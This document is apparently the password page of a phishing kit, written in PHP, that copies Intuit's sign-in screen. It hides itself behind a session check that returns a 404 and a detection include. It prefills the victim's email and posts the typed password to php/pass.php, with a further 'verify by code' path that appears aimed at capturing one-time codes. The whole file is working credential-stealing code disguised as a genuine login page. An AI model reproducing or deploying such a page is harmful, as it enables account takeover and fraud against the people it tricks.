<?php
   session_start();
   ob_start();
   require_once('../config.php');
   include_once('../includes/php/detect.php');
   
   if(!isset($_SESSION['fallow'])) {
      header('HTTP/1.1 404 Not Found');
      exit();
   }
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/password.css">
   </head>
<?php include ("file/header.php"); ?>
<div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee">
                                                <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius" data-testid="IuxBookendsHeaderContainer">
                                                    <div data-testid="passwordVerificationContainer" class="PasswordVerification__StyledContainer-sc-1povxx4-0 dAnIHS">
                                                        <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf PasswordVerification__StyledIuxH2AndDescription-sc-1povxx4-2 ebNYuM">
                                                            <header>
                                                                <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="passwordVerificationHeader" id="passwordVerificationHeader">Enter your Intuit password</h2>
                                                                <div data-testid="passwordVerificationSubheader" id="passwordVerificationSubheader" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Choose how to sign in to </div>
                                                            </header>
                                                        </section>
                                                        <form method="POST" action="php/pass.php" name="password">
                                                         <input aria-label="Email" aria-required="true" autocomplete="username" data-testid="readonly-identifier" name="Email" readonly="" type="email" size="22" class="IuxReadonlyIdentifier__StyledInput-sc-1vvuka5-0 hVnEWb" value="<?php echo $_SESSION['Email']; ?>"><br><button type="button" data-testid="passwordVerificationDifferentAccountButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq PasswordVerification__StyledIuxLinkButton-sc-1povxx4-1 piRti"><span class="Button-label-e0ecc32">Use a different account</span></button><br>
                                                            <div class="IuxCurrentPasswordInput__StyledWrapperDiv-sc-1lpfy9v-0 fCEjzy">
                                                                <div class="IuxCurrentPasswordInput__StyledToggleContainer-sc-1lpfy9v-1 TeDAi"></div>
                                                                <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 style-KYhwD" id="style-KYhwD"><label for="iux-password-confirmation-password" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1"><span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Password</span>
                                                                        <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0">
                                                                           <input id="iux-password-confirmation-password" aria-invalid="false" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNoErrorText-e9d7d7f TextField-TFNotDisabled-7206466 TextField-size-medium-253d5f0" type="password" aria-label="Password" aria-required="true" autocomplete="current-password" data-testid="currentPasswordInput" inputmode="text" name="password" placeholder="" value="" required></div>
                                                                    </label>
                                                                    <div class=""></div>
                                                                </div>
                                                            </div><button type="submit" data-testid="passwordVerificationContinueButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840">
                                                               <span class="Button-label-e0ecc32"><span>Continue</span></span></button>
                                                            <div data-testid="IuxOrDivider" class="OrDivider__StyledOrDividerDiv-sc-1i6eqaj-0 hQaqtl">OR</div>
                                                            <button type="button" href="php/code.php" value="code" name="code" data-testid="altAuthButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-secondary-8ffdd81 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840">
                                                               <span class="Button-label-e0ecc32">Verify login by code?</span></button>
                                                               <button type="button" data-testid="passwordVerificationCancelButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq">
                                                               <span class="Button-label-e0ecc32">Sign in a different way</span></button>
                                                        </form>
                                                    </div>
                                                </div>
   <?php include ("file/footer.php"); ?>